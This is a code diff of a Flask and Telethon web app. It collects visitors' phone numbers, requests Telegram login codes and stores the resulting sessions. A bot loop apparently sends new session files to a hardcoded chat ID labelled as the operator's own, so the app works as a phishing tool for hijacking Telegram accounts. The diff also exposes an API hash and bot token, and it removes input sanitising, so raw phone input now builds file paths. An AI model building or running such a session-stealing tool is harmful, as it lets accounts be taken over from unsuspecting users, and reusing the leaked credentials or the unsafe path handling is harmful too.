@@ -4,12 +4,11 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 import os
 import asyncio
 import threading
-import re
 
 API_ID = 26006502
 API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
 
-BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"  # токен бота
+BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"
 CHAT_ID = 7440693813  # твой Telegram ID
 
 os.makedirs("sessions", exist_ok=True)
@@ -21,7 +20,6 @@ loop = asyncio.new_event_loop()
 
 # Запуск бота в этом loop
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
-
 
 sent_files = set()
 clients = {}
@@ -43,7 +41,7 @@ async def send_new_sessions():
 
 def start_loop():
     asyncio.set_event_loop(loop)
-    bot.start(bot_token=BOT_TOKEN)  # Запускаем бота синхронно в этом потоке
+    bot.start(bot_token=BOT_TOKEN)
     loop.create_task(send_new_sessions())
     loop.run_forever()
 
@@ -57,7 +55,7 @@ def run_async(coro):
 
 
 async def create_and_connect_client(session_name, phone):
-    """Создаём клиента внутри основного loop"""
+    """Создаём клиента и запрашиваем код"""
     client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
     await client.connect()
     await client.send_code_request(phone)
@@ -68,15 +66,10 @@ async def create_and_connect_client(session_name, phone):
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
-        phone_raw = request.form["phone"].strip()
+        # Берем номер ровно как ввел пользователь
+        phone = request.form["phone"].strip()
 
-        # Оставляем + если он в начале, остальные символы — только цифры
-        cleaned = re.sub(r'[^\d+]', '', phone_raw)
-        if not cleaned.startswith('+'):
-            cleaned = '+' + cleaned  # Добавляем +, если его не было
-
-        phone = cleaned
-        session_name = f"sessions/{phone}"
+        session_name = f"sessions/{phone.replace('+', '').replace(' ', '').replace('(', '').replace(')', '')}"
 
         try:
             run_async(create_and_connect_client(session_name, phone))
@@ -85,7 +78,6 @@ def index():
             return render_template("index.html", stage="phone", error=str(e))
 
     return render_template("index.html", stage="phone")
-
 
 
 @app.route("/code", methods=["POST"])
